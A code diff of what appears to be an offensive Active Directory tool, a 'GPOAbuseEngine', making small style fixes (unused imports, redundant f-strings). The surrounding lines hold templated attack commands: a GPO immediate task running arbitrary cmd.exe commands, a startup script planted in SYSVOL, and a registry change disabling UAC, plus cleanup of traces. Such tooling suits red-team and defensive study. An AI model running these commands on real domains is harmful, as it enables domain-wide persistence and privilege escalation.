@@ -10,9 +10,8 @@ compromised GPO can provide domain-wide persistence or privilege escalation.
 
 from __future__ import annotations
 
-import re
 from dataclasses import dataclass, field
-from typing import Any, Optional
+from typing import Any
 
 GPO_ABUSE_TECHNIQUES = [
     "ScheduledTask",
@@ -199,7 +198,7 @@ class GPOAbuseEngine:
             trigger_timing="Next gpupdate or reboot",
             commands=[
                 f'New-GPOImmediateTask -GPOName "{gpo.display_name}" -TaskName "{task_name}" -Command "cmd.exe" -CommandArgs "/c {command}"',
-                f"gpupdate /force /target:computer",
+                "gpupdate /force /target:computer",
             ],
             cleanup_commands=[
                 f'Remove-GPOImmediateTask -GPOName "{gpo.display_name}" -TaskName "{task_name}"',
@@ -228,7 +227,7 @@ class GPOAbuseEngine:
                 f"mkdir {sysvol_path}",
                 f'Set-Content -Path "{sysvol_path}\\{script_name}" -Value "{script_content}"',
                 f'Set-Content -Path "{sysvol_path}\\scripts.ini" -Value "[Startup]\\r\\n0CmdLine={script_name}\\r\\n0Parameters="',
-                f"gpupdate /force",
+                "gpupdate /force",
             ],
             cleanup_commands=[
                 f"Remove-Item -Path \"{sysvol_path}\\{script_name}\" -Force",
@@ -284,7 +283,7 @@ class GPOAbuseEngine:
             commands=[
                 f'Set-GPPrefRegistryValue -Name "{gpo.display_name}" -Context Computer -Key "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -ValueName "EnableLUA" -Type DWORD -Value 0',
                 f'Set-GPPrefRegistryValue -Name "{gpo.display_name}" -Context Computer -Action Update -Key "HKLM\\..."',
-                f"New-GPOImmediateTask or local admin addition via preferences",
+                "New-GPOImmediateTask or local admin addition via preferences",
             ],
             cleanup_commands=[
                 f'Remove-GPPrefRegistryValue -Name "{gpo.display_name}" -Context Computer -Key "..."',
